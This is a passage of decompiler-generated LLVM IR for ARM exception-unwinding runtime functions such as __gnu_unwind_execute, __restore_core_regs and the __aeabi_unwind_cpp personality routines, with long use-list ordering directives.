  uselistorder label %bb154, { 2, 0, 1 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %dec_label_pc_19a94, { 1, 0 }
  uselistorder label %dec_label_pc_19a94.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_19a94.preheader.lr.ph, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
}

define i32 @function_19f34(i32 %arg1) local_unnamed_addr {
dec_label_pc_19f34:
  %v0_19f34 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_19f34, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_19f34
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_19f34, %bb
  %v10_19f3c = phi i32 [ %arg1, %dec_label_pc_19f34 ], [ 0, %bb ]
  ret i32 %v10_19f3c

; uselistorder directives
  uselistorder i1 false, { 0, 1, 2, 3, 96, 97, 98, 113, 91, 95, 114, 115, 116, 117, 118, 5, 4, 119, 110, 111, 99, 100, 92, 103, 102, 101, 104, 6, 10, 9, 88, 71, 107, 112, 93, 94, 87, 89, 90, 72, 73, 74, 75, 76, 70, 69, 68, 67, 7, 8, 77, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 21, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 78, 79, 80, 81, 82, 83, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 105, 84, 85, 86, 109, 106, 108, 120, 121 }
  uselistorder i1* @cpsr_z, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 41, 14, 15, 16, 37, 38, 39, 40, 0, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 35, 36, 33, 34 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__aeabi_unwind_cpp_pr2(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_19f44 = load i32, i32* @r1, align 4
  %v2_19f44 = load i32, i32* @r2, align 4
  %v4_19f44 = call i32 @__gnu_unwind_pr_common(i32 2, i32 %v1_19f44, i32 %v2_19f44, i32 2)
  ret i32 %v4_19f44
}

define i32 @__aeabi_unwind_cpp_pr1(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_19f4c = load i32, i32* @r1, align 4
  %v2_19f4c = load i32, i32* @r2, align 4
  %v4_19f4c = call i32 @__gnu_unwind_pr_common(i32 1, i32 %v1_19f4c, i32 %v2_19f4c, i32 1)
  ret i32 %v4_19f4c
}

define i32 @__aeabi_unwind_cpp_pr0(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_19f54 = load i32, i32* @r1, align 4
  %v2_19f54 = load i32, i32* @r2, align 4
  %v4_19f54 = call i32 @__gnu_unwind_pr_common(i32 0, i32 %v1_19f54, i32 %v2_19f54, i32 0)
  ret i32 %v4_19f54

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @__gnu_unwind_pr_common, { 2, 1, 0 }
  uselistorder i32* @r2, { 12, 11, 10, 57, 13, 0, 22, 14, 23, 58, 59, 60, 18, 19, 20, 21, 39, 40, 41, 42, 61, 62, 63, 77, 78, 79, 80, 1, 66, 67, 2, 68, 69, 3, 70, 64, 65, 33, 34, 4, 5, 6, 55, 56, 7, 8, 43, 44, 45, 71, 72, 73, 74, 75, 76, 35, 36, 37, 46, 47, 48, 54, 24, 15, 16, 17, 27, 28, 25, 26, 29, 30, 31, 32, 38, 9, 49, 50, 51, 52, 53 }
}

define i32 @__restore_core_regs(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_19f5c = add i32 %tmp, 56
  %v4_19f5c = inttoptr i32 %v3_19f5c to i32*
  %v5_19f5c = load i32, i32* %v4_19f5c, align 4
  %v6_19f5c = add i32 %tmp, 60
  %v7_19f5c = inttoptr i32 %v6_19f5c to i32*
  %v8_19f5c = load i32, i32* %v7_19f5c, align 4
  %v2_19f68 = load i32, i32* %arg1, align 4
  %v3_19f68 = add i32 %tmp, 4
  %v4_19f68 = inttoptr i32 %v3_19f68 to i32*
  %v5_19f68 = load i32, i32* %v4_19f68, align 4
  store i32 %v5_19f68, i32* @r1, align 4
  %v12_19f68 = add i32 %tmp, 16
  %v13_19f68 = inttoptr i32 %v12_19f68 to i32*
  %v14_19f68 = load i32, i32* %v13_19f68, align 4
  store i32 %v14_19f68, i32* @r4, align 4
  %v15_19f68 = add i32 %tmp, 20
  %v16_19f68 = inttoptr i32 %v15_19f68 to i32*
  %v17_19f68 = load i32, i32* %v16_19f68, align 4
  store i32 %v17_19f68, i32* @r5, align 4
  %v18_19f68 = add i32 %tmp, 24
  %v19_19f68 = inttoptr i32 %v18_19f68 to i32*
  %v20_19f68 = load i32, i32* %v19_19f68, align 4
  store i32 %v20_19f68, i32* @r6, align 4
  %v21_19f68 = add i32 %tmp, 28
  %v22_19f68 = inttoptr i32 %v21_19f68 to i32*
  %v23_19f68 = load i32, i32* %v22_19f68, align 4
  store i32 %v23_19f68, i32* @r7, align 4
  %v24_19f68 = add i32 %tmp, 32
  %v25_19f68 = inttoptr i32 %v24_19f68 to i32*
  %v26_19f68 = load i32, i32* %v25_19f68, align 4
  store i32 %v26_19f68, i32* @r8, align 4
  %v27_19f68 = add i32 %tmp, 36
  %v28_19f68 = inttoptr i32 %v27_19f68 to i32*
  %v29_19f68 = load i32, i32* %v28_19f68, align 4
  store i32 %v29_19f68, i32* @sb, align 4
  %v30_19f68 = add i32 %tmp, 40
  %v31_19f68 = inttoptr i32 %v30_19f68 to i32*
  %v32_19f68 = load i32, i32* %v31_19f68, align 4
  store i32 %v32_19f68, i32* @sl, align 4
  store i32 %v8_19f5c, i32* @ip, align 4
  store i32 %v5_19f5c, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v8_19f5c)
  ret i32 %v2_19f68

; uselistorder directives
  uselistorder i32 %v8_19f5c, { 1, 0 }
  uselistorder i32 %tmp, { 7, 6, 5, 4, 3, 2, 1, 0, 9, 8 }
  uselistorder i32* @ip, { 52, 53, 54, 55, 11, 12, 5, 0, 58, 6, 56, 57, 9, 10, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 1, 92, 93, 94, 95, 96, 97, 98, 99, 100, 7, 101, 102, 103, 31, 32, 47, 48, 39, 40, 41, 2, 42, 43, 44, 35, 36, 37, 38, 45, 46, 33, 15, 34, 18, 8, 13, 14, 25, 26, 27, 28, 29, 30, 19, 20, 21, 22, 23, 24, 3, 16, 17, 49, 4, 50, 51 }
  uselistorder i32 40, { 33, 29, 30, 31, 32, 11, 34, 3, 12, 7, 8, 4, 15, 2, 9, 6, 13, 14, 10, 16, 17, 18, 5, 19, 20, 0, 21, 23, 22, 24, 1, 25, 27, 26, 28 }
  uselistorder i32* @sb, { 123, 124, 125, 3, 4, 5, 6, 7, 8, 9, 2, 105, 106, 107, 108, 109, 110, 111, 112, 113, 116, 114, 115, 117, 88, 89, 61, 62, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 1, 21, 22, 0, 27, 28, 23, 24, 25, 26, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 118, 119, 120, 121, 122 }
  uselistorder i32 36, { 17, 16, 4, 18, 6, 7, 5, 12, 15, 8, 13, 9, 0, 1, 2, 3, 10, 14, 11 }
  uselistorder i32* @r8, { 268, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 2, 267, 0, 41, 269, 11, 270, 12, 42, 43, 44, 45, 28, 29, 30, 31, 32, 33, 34, 35, 36, 4, 37, 38, 39, 40, 46, 47, 48, 49, 13, 271, 14, 15, 25, 26, 5, 27, 203, 204, 6, 205, 206, 207, 231, 232, 233, 234, 235, 10, 236, 237, 238, 239, 240, 241, 242, 243, 16, 179, 180, 181, 182, 17, 193, 194, 195, 196, 197, 136, 137, 138, 139, 50, 51, 52, 53, 18, 19, 91, 92, 93, 94, 95, 54, 55, 56, 57, 96, 97, 98, 99, 58, 59, 60, 61, 62, 63, 64, 20, 21, 22, 23, 24, 1, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 7, 84, 85, 86, 87, 88, 89, 90, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 8, 158, 159, 160, 161, 162, 163, 164, 165, 9, 166, 167, 168, 169, 170, 171, 3, 172, 173, 174, 175, 176, 177, 178, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 198, 199, 200, 201, 202, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 244, 245, 246, 247, 248, 249 }
  uselistorder i32 32, { 87, 84, 85, 86, 47, 88, 89, 43, 53, 90, 42, 81, 48, 44, 65, 63, 64, 60, 61, 62, 73, 74, 66, 67, 56, 57, 58, 71, 72, 49, 79, 80, 82, 2, 3, 5, 4, 83, 7, 6, 9, 8, 11, 10, 59, 45, 50, 46, 75, 13, 12, 15, 14, 17, 16, 19, 18, 54, 68, 55, 21, 20, 22, 24, 23, 25, 26, 28, 27, 69, 70, 76, 29, 30, 51, 31, 32, 33, 52, 34, 0, 35, 1, 36, 77, 37, 78, 38, 39, 40, 41 }
  uselistorder i32 28, { 45, 10, 28, 46, 25, 47, 48, 49, 50, 7, 29, 30, 26, 27, 34, 11, 31, 12, 42, 43, 44, 8, 13, 0, 18, 1, 19, 2, 20, 3, 21, 4, 22, 5, 23, 6, 24, 9, 33, 17, 32, 14, 15, 16, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 24, { 97, 96, 98, 9, 10, 99, 1, 59, 60, 61, 62, 63, 64, 57, 58, 11, 65, 66, 76, 77, 67, 68, 8, 12, 95, 90, 91, 92, 2, 78, 79, 80, 38, 39, 13, 69, 54, 70, 71, 47, 41, 42, 43, 44, 45, 46, 48, 49, 50, 51, 52, 53, 55, 56, 72, 73, 74, 40, 75, 14, 15, 16, 0, 17, 18, 3, 19, 20, 21, 4, 22, 23, 5, 24, 25, 26, 27, 28, 29, 6, 81, 30, 82, 83, 84, 85, 31, 32, 7, 86, 33, 87, 34, 35, 36, 88, 89, 93, 37, 94 }
  uselistorder i32 20, { 129, 127, 128, 130, 1, 4, 9, 34, 131, 30, 132, 133, 134, 135, 5, 136, 137, 2, 138, 35, 10, 31, 32, 33, 36, 37, 38, 51, 52, 39, 40, 139, 120, 121, 122, 123, 124, 125, 126, 11, 116, 117, 118, 3, 53, 12, 54, 55, 0, 29, 42, 13, 44, 6, 45, 46, 47, 48, 27, 28, 43, 41, 49, 50, 56, 57, 14, 58, 59, 60, 61, 62, 63, 64, 65, 15, 66, 67, 68, 69, 70, 71, 16, 72, 73, 17, 74, 75, 76, 77, 18, 78, 79, 19, 80, 81, 82, 83, 84, 20, 85, 86, 87, 88, 89, 90, 21, 91, 92, 93, 94, 22, 23, 95, 7, 96, 24, 97, 98, 99, 100, 8, 101, 25, 102, 103, 104, 105, 106, 26, 107, 108, 109, 110, 111, 112, 113, 114, 115, 119 }
  uselistorder i32* @r1, { 166, 18, 17, 16, 4, 167, 168, 62, 63, 79, 42, 2, 170, 43, 169, 152, 44, 45, 46, 19, 64, 1, 65, 66, 20, 173, 21, 5, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 6, 191, 192, 67, 69, 70, 71, 72, 73, 74, 75, 76, 77, 68, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 61, 60, 3, 78, 22, 105, 106, 193, 23, 195, 196, 197, 198, 128, 129, 29, 194, 24, 30, 159, 160, 161, 162, 163, 164, 165, 41, 97, 98, 154, 7, 150, 151, 8, 155, 158, 156, 9, 157, 81, 82, 25, 149, 83, 153, 130, 131, 12, 31, 32, 33, 34, 35, 36, 37, 10, 201, 202, 203, 204, 0, 205, 26, 80, 107, 124, 199, 200, 171, 172, 27, 13, 84, 108, 109, 110, 111, 112, 28, 132, 133, 85, 86, 38, 39, 40, 87, 88, 89, 91, 92, 90, 134, 93, 94, 95, 96, 99, 100, 101, 14, 102, 103, 104, 113, 114, 115, 15, 116, 145, 146, 11, 117, 118, 119, 120, 121, 122, 123, 125, 126, 127, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 147, 148 }
  uselistorder i32 60, { 3, 24, 25, 26, 4, 5, 1, 6, 17, 18, 19, 20, 21, 22, 7, 13, 14, 8, 15, 16, 9, 10, 0, 11, 12, 2, 23 }
  uselistorder i32 56, { 3, 33, 34, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 10, 9, 2, 11, 12, 13, 14, 15, 30, 31, 26, 27, 4, 5, 1, 6, 0, 7, 8, 28, 29, 32 }
}

define i32 @__gnu_Unwind_Restore_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_19f78 = load i32, i32* @r0, align 4
  ret i32 %v1_19f78
}

define i32 @__gnu_Unwind_Save_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_19f80 = load i32, i32* @r0, align 4
  ret i32 %v1_19f80
}

define i32 @___Unwind_RaiseException(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_19f94 = ptrtoint i32* %stack_var_-68 to i32
  %v2_19f98 = call i32 @__gnu_Unwind_RaiseException(i32 %v2_19f94, i32 0)
  ret i32 %v2_19f98

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_Resume(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_19fb8 = ptrtoint i32* %stack_var_-68 to i32
  %v2_19fbc = call i32 @__gnu_Unwind_Resume(i32 %v2_19fb8, i32 0)
  ret i32 %v2_19fbc

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @_Unwind_Resume_or_Rethrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_19fdc = ptrtoint i32* %stack_var_-68 to i32
  %v2_19fe0 = call i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %v2_19fdc, i32 0)
  ret i32 %v2_19fe0

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_ForcedUnwind(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_1a000 = ptrtoint i32* %stack_var_-68 to i32
  %v6_1a004 = call i32 @__gnu_Unwind_ForcedUnwind(i32 %v2_1a000, i32 %arg2, i8* %arg3, i32 %v2_1a000)
  ret i32 %v6_1a004

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i8* @_Unwind_GetLanguageSpecificData(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_1a030 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_1a038 = add i32 %tmp1, 76
  %v2_1a038 = inttoptr i32 %v1_1a038 to i32*
  %v3_1a038 = load i32, i32* %v2_1a038, align 4
  %v1_1a03c = add i32 %v3_1a038, 7
  %v2_1a03c = inttoptr i32 %v1_1a03c to i8*
  %v3_1a03c = load i8, i8* %v2_1a03c, align 1
  %v4_1a03c = zext i8 %v3_1a03c to i32
  %v1_1a040 = add i32 %v3_1a038, 8
  %v3_1a044 = mul nuw nsw i32 %v4_1a03c, 4
  %v2_1a048 = add i32 %v3_1a044, %v1_1a040
  %v3_1a048 = inttoptr i32 %v2_1a048 to i8*
  ret i8* %v3_1a048
}

define i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %uws) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint %anon_struct_13* %uws to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %context, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v9_1a058 = load i32, i32* @r6, align 4
  %v21_1a058 = load i32, i32* @lr, align 4
  %v0_1a05c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1a05c, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 0, i32* @sl, align 4
  %tmp146 = bitcast i32* %stack_var_-36 to i8*
  br label %dec_label_pc_1a06c

dec_label_pc_1a06c:                               ; preds = %dec_label_pc_1a06c.backedge, %entry
  %v3_1a078 = phi i32 [ %v0_1a06c.pre, %dec_label_pc_1a06c.backedge ], [ %tmp, %entry ]
  %v1_1a06c = add i32 %v3_1a078, 8
  %v2_1a06c = inttoptr i32 %v1_1a06c to i8*
  %v3_1a06c = load i8, i8* %v2_1a06c, align 1
  %v4_1a06c = zext i8 %v3_1a06c to i32
  store i32 %v4_1a06c, i32* %r3.global-to-local, align 4
  %v2_1a070 = icmp eq i8 %v3_1a06c, 0
  store i1 %v2_1a070, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a070, label %dec_label_pc_1a080, label %.thread

.thread:                                          ; preds = %dec_label_pc_1a06c
  %v2_1a074 = add nsw i32 %v4_1a06c, -1
  store i32 %v2_1a074, i32* %r3.global-to-local, align 4
  %v2_1a078 = trunc i32 %v2_1a074 to i8
  store i8 %v2_1a078, i8* %v2_1a06c, align 1
  %v0_1a07c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a07c.pr.pr, label %.thread.dec_label_pc_1a080_crit_edge, label %dec_label_pc_1a0a8

.thread.dec_label_pc_1a080_crit_edge:             ; preds = %.thread
  %v0_1a080.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a080

dec_label_pc_1a080:                               ; preds = %.thread.dec_label_pc_1a080_crit_edge, %dec_label_pc_1a06c
  %v0_1a080 = phi i32 [ %v0_1a080.pre, %.thread.dec_label_pc_1a080_crit_edge ], [ %v3_1a078, %dec_label_pc_1a06c ]
  %v1_1a080 = add i32 %v0_1a080, 9
  %v2_1a080 = inttoptr i32 %v1_1a080 to i8*
  %v3_1a080 = load i8, i8* %v2_1a080, align 1
  %v4_1a080 = zext i8 %v3_1a080 to i32
  store i32 %v4_1a080, i32* %r3.global-to-local, align 4
  %v2_1a084 = icmp eq i8 %v3_1a080, 0
  store i1 %v2_1a084, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a084, label %dec_label_pc_1a188, label %dec_label_pc_1a08c

dec_label_pc_1a08c:                               ; preds = %dec_label_pc_1a17c, %dec_label_pc_1a080
  %v2_1a090 = phi i32 [ %v0_1a17c, %dec_label_pc_1a17c ], [ %v0_1a080, %dec_label_pc_1a080 ]
  %v0_1a08c = phi i32 [ %v4_1a17c, %dec_label_pc_1a17c ], [ %v4_1a080, %dec_label_pc_1a080 ]
  %v1_1a08c = add nsw i32 %v0_1a08c, -1
  store i32 %v1_1a08c, i32* %r3.global-to-local, align 4
  %v1_1a090 = trunc i32 %v1_1a08c to i8
  %v3_1a090 = add i32 %v2_1a090, 9
  %v4_1a090 = inttoptr i32 %v3_1a090 to i8*
  store i8 %v1_1a090, i8* %v4_1a090, align 1
  %v0_1a094 = load i32, i32* @r5, align 4
  %v1_1a094 = add i32 %v0_1a094, 4
  %v2_1a094 = inttoptr i32 %v1_1a094 to i32*
  %v3_1a094 = load i32, i32* %v2_1a094, align 4
  store i32 %v3_1a094, i32* %r2.global-to-local, align 4
  %v1_1a098 = inttoptr i32 %v3_1a094 to i32*
  %v2_1a098 = load i32, i32* %v1_1a098, align 4
  store i32 %v2_1a098, i32* %r0.global-to-local, align 4
  %v4_1a098 = add i32 %v3_1a094, 4
  store i32 %v4_1a098, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_1a0a0 = inttoptr i32 %v0_1a094 to i32*
  store i32 %v2_1a098, i32* %v1_1a0a0, align 4
  %v5_1a0a0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_1a0a0, i32* %v2_1a094, align 4
  %v0_1a0a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a0a4 = trunc i32 %v0_1a0a4 to i8
  %v2_1a0a4 = load i32, i32* @r5, align 4
  %v3_1a0a4 = add i32 %v2_1a0a4, 8
  %v4_1a0a4 = inttoptr i32 %v3_1a0a4 to i8*
  store i8 %v1_1a0a4, i8* %v4_1a0a4, align 1
  br label %dec_label_pc_1a0a8

dec_label_pc_1a0a8:                               ; preds = %.thread, %dec_label_pc_1a08c, %.thread6
  %v0_1a0a8 = load i32, i32* @r5, align 4
  %v1_1a0a8 = inttoptr i32 %v0_1a0a8 to i32*
  %v2_1a0a8 = load i32, i32* %v1_1a0a8, align 4
  %v3_1a0ac = udiv i32 %v2_1a0a8, 16777216
  store i32 %v3_1a0ac, i32* @r4, align 4
  store i32 %v3_1a0ac, i32* %ip.global-to-local, align 4
  %v3_1a0b4 = mul i32 %v2_1a0a8, 256
  store i32 %v3_1a0b4, i32* %r0.global-to-local, align 4
  %tmp182 = and i32 %v2_1a0a8, -16777216
  %tmp183 = icmp eq i32 %tmp182, -1342177280
  store i1 %tmp183, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_1a0b4, i32* %v1_1a0a8, align 4
  br i1 %tmp183, label %dec_label_pc_1a188, label %dec_label_pc_1a0c4

dec_label_pc_1a0c4:                               ; preds = %dec_label_pc_1a0a8
  %v0_1a0c4 = load i32, i32* @r4, align 4
  %v1_1a0c4 = and i32 %v0_1a0c4, 128
  store i32 %v1_1a0c4, i32* %r1.global-to-local, align 4
  %v2_1a0c4 = icmp eq i32 %v1_1a0c4, 0
  store i1 %v2_1a0c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a0c4, label %dec_label_pc_1a1a0, label %dec_label_pc_1a0cc

dec_label_pc_1a0cc:                               ; preds = %dec_label_pc_1a0c4
  %v1_1a0cc = and i32 %v0_1a0c4, 240
  store i32 %v1_1a0cc, i32* @r6, align 4
  %v7_1a0d0 = icmp eq i32 %v1_1a0cc, 128
  store i1 %v7_1a0d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a0d0, label %dec_label_pc_1a0d8, label %dec_label_pc_1a1fc

dec_label_pc_1a0d8:                               ; preds = %dec_label_pc_1a0cc
  %v0_1a0d8 = load i32, i32* @r5, align 4
  %v1_1a0d8 = add i32 %v0_1a0d8, 8
  %v2_1a0d8 = inttoptr i32 %v1_1a0d8 to i8*
  %v3_1a0d8 = load i8, i8* %v2_1a0d8, align 1
  %v4_1a0d8 = zext i8 %v3_1a0d8 to i32
  store i32 %v4_1a0d8, i32* %r3.global-to-local, align 4
  %v2_1a0dc = icmp eq i8 %v3_1a0d8, 0
  store i1 %v2_1a0dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a0dc, label %dec_label_pc_1a0ec, label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1a0d8
  %v2_1a0e0 = add nsw i32 %v4_1a0d8, -1
  store i32 %v2_1a0e0, i32* %r3.global-to-local, align 4
  %v2_1a0e4 = trunc i32 %v2_1a0e0 to i8
  store i8 %v2_1a0e4, i8* %v2_1a0d8, align 1
  %v0_1a0e8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a0e8.pr.pr, label %.thread3.dec_label_pc_1a0ec_crit_edge, label %dec_label_pc_1a11c

.thread3.dec_label_pc_1a0ec_crit_edge:            ; preds = %.thread3
  %v0_1a0ec.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a0ec

dec_label_pc_1a0ec:                               ; preds = %.thread3.dec_label_pc_1a0ec_crit_edge, %dec_label_pc_1a0d8
  %v2_1a100 = phi i32 [ %v0_1a0ec.pre, %.thread3.dec_label_pc_1a0ec_crit_edge ], [ %v0_1a0d8, %dec_label_pc_1a0d8 ]
  %v1_1a0ec = add i32 %v2_1a100, 9
  %v2_1a0ec = inttoptr i32 %v1_1a0ec to i8*
  %v3_1a0ec = load i8, i8* %v2_1a0ec, align 1
  %v4_1a0ec = zext i8 %v3_1a0ec to i32
  store i32 %v4_1a0ec, i32* %r3.global-to-local, align 4
  %v2_1a0f0 = icmp eq i8 %v3_1a0ec, 0
  store i1 %v2_1a0f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a0f0, label %dec_label_pc_1a12c, label %dec_label_pc_1a0fc

dec_label_pc_1a0fc:                               ; preds = %dec_label_pc_1a0ec
  %v1_1a0fc = add nsw i32 %v4_1a0ec, -1
  store i32 %v1_1a0fc, i32* %r3.global-to-local, align 4
  %v1_1a100 = trunc i32 %v1_1a0fc to i8
  store i8 %v1_1a100, i8* %v2_1a0ec, align 1
  %v0_1a104 = load i32, i32* @r5, align 4
  %v1_1a104 = add i32 %v0_1a104, 4
  %v2_1a104 = inttoptr i32 %v1_1a104 to i32*
  %v3_1a104 = load i32, i32* %v2_1a104, align 4
  store i32 %v3_1a104, i32* %r2.global-to-local, align 4
  %v1_1a108 = inttoptr i32 %v3_1a104 to i32*
  %v2_1a108 = load i32, i32* %v1_1a108, align 4
  store i32 %v2_1a108, i32* %r0.global-to-local, align 4
  %v4_1a108 = add i32 %v3_1a104, 4
  store i32 %v4_1a108, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1a108, i32* %v2_1a104, align 4
  %v0_1a114 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a114 = trunc i32 %v0_1a114 to i8
  %v2_1a114 = load i32, i32* @r5, align 4
  %v3_1a114 = add i32 %v2_1a114, 8
  %v4_1a114 = inttoptr i32 %v3_1a114 to i8*
  store i8 %v1_1a114, i8* %v4_1a114, align 1
  %v0_1a118 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a118 = load i32, i32* @r5, align 4
  %v2_1a118 = inttoptr i32 %v1_1a118 to i32*
  store i32 %v0_1a118, i32* %v2_1a118, align 4
  br label %dec_label_pc_1a11c

dec_label_pc_1a11c:                               ; preds = %.thread3, %dec_label_pc_1a0fc
  %v0_1a11c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1a11c, i32* %r3.global-to-local, align 4
  %v3_1a120 = mul i32 %v0_1a11c, 256
  store i32 %v3_1a120, i32* %r0.global-to-local, align 4
  %v1_1a124 = load i32, i32* @r5, align 4
  %v2_1a124 = inttoptr i32 %v1_1a124 to i32*
  store i32 %v3_1a120, i32* %v2_1a124, align 4
  %v0_1a128 = load i32, i32* %r3.global-to-local, align 4
  %v3_1a128 = udiv i32 %v0_1a128, 16777216
  br label %dec_label_pc_1a12c

dec_label_pc_1a12c:                               ; preds = %dec_label_pc_1a0ec, %dec_label_pc_1a11c
  %storemerge133 = phi i32 [ %v3_1a128, %dec_label_pc_1a11c ], [ 176, %dec_label_pc_1a0ec ]
  %v1_1a12c = load i32, i32* %ip.global-to-local, align 4
  %v4_1a12c = mul i32 %v1_1a12c, 256
  %v5_1a12c = or i32 %v4_1a12c, %storemerge133
  store i32 %v5_1a12c, i32* %r2.global-to-local, align 4
  %v7_1a130 = icmp eq i32 %v5_1a12c, 32768
  store i1 %v7_1a130, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a130, label %dec_label_pc_1a33c, label %dec_label_pc_1a138

dec_label_pc_1a138:                               ; preds = %dec_label_pc_1a12c
  %v3_1a138 = mul i32 %v5_1a12c, 16
  store i32 %v3_1a138, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_1a148 = and i32 %v3_1a138, 65520
  store i32 %v3_1a148, i32* %r2.global-to-local, align 4
  %v0_1a14c = load i32, i32* @r7, align 4
  store i32 %v0_1a14c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_1a154 = call i32 @_Unwind_VRS_Pop(i32 %v0_1a14c, i32 %v3_1a148, i32 0, i32 0)
  store i32 %v4_1a154, i32* %r0.global-to-local, align 4
  %v2_1a158 = icmp eq i32 %v4_1a154, 0
  store i1 %v2_1a158, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a158, label %dec_label_pc_1a160, label %dec_label_pc_1a33c

dec_label_pc_1a160:                               ; preds = %dec_label_pc_1a138
